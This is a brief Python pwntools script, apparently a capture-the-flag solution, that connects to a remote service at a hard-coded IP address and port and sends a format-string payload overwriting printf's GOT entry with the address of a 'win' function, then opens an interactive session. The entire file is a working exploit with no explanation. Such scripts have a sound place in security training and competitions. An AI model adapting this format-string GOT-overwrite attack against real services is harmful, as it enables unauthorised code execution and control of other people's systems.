from pwn import *

exe = context.binary = ELF('sentry', checksec=False)
context.log_level = 'debug'

win = 0x40121d
printf_got = 0x404028
fmt_offset = 6

io = connect('139.59.230.119', 10096)

payload = fmtstr_payload(fmt_offset, {printf_got: win}, write_size='short')

io.clean()
io.sendline(payload)
io.interactive()
